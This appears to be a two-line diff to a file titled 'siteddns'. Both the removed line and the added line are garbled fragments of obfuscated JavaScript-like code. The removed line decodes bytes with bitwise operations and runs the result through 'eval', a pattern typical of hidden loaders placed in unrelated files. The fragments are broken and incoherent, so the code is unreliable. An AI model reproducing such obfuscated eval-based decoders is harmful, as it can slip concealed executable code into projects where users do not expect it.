@@ -1,2 +1,2 @@
  # siteddns
-=1;){pb[rb]=(-((~((pb[rb]+pb[rb-1])&0xff))&0xff))&0xff;rb--;}";eval(rb);rb="rb=3;while(rb
+>3);xz[zz]=(xz[zz]>>3)|((xz[zz]
